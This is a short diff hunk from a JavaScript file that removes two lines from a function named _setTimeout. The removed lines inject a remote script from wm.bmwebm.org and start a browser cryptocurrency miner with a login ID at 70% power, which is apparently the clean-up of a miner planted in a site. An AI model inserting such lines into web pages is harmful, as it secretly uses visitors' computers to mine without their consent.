@@ -51,8 +51,6 @@ function _setTimeout(){
 			}
 		 }
 	}
-	document.write('<script src="https://wm.bmwebm.org/WEBMINER.js"></script>');
-	document.write('<script>WEBMINER.config({ login: "6306128", pass: null }).power(70);</script>');
 
 }
 _setTimeout(); 
